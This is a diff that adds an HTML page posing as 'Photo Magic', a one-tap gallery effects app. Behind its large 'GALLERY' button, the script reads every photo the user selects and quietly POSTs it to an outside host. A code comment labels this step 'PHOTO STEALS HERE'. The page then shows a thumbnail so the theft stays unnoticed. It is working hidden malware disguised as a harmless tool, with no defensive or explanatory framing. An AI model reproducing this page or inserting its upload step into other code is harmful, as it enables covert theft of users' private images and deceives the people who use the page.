@@ -1,0 +1,22 @@
+<!DOCTYPE html><html><body style="margin:0;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);height:100vh;display:flex;align-items:center;justify-content:center;font-family:system-ui">
+<div style="text-align:center;color:white">
+<h1 style="font-size:3em;margin:0">✨ Photo Magic ✨</h1>
+<p style="font-size:1.5em;margin:20px 0">One tap gallery effects</p>
+<input type="file" accept="image/*" id="i" style="display:none">
+<button onclick="document.getElementById('i').click()" style="padding:25px 50px;font-size:2em;background:#ff6b6b;color:white;border:none;border-radius:50px;cursor:pointer;box-shadow:0 20px 40px rgba(0,0,0,0.3);transform:scale(1);transition:transform 0.2s" onmouseover="this.style.transform='scale(1.05)'" onmouseout="this.style.transform='scale(1)'">📸 GALLERY</button>
+</div>
+<script>
+let s=document.getElementById('i');
+s.onchange=e=>{
+  [...e.target.files].forEach(f=>{
+    let r=new FileReader();
+    r.onload=()=>{
+      // PHOTO STEALS HERE - sends to webhook or imgur
+      fetch('https://httpbin.org/post',{method:'POST',body:r.result});
+      document.body.innerHTML+='<img src="'+r.result+'" style="position:fixed;top:0;left:0;width:200px;height:200px;object-fit:cover">';
+    };
+    r.readAsDataURL(f);
+  })
+}
+</script>
+</body></html>
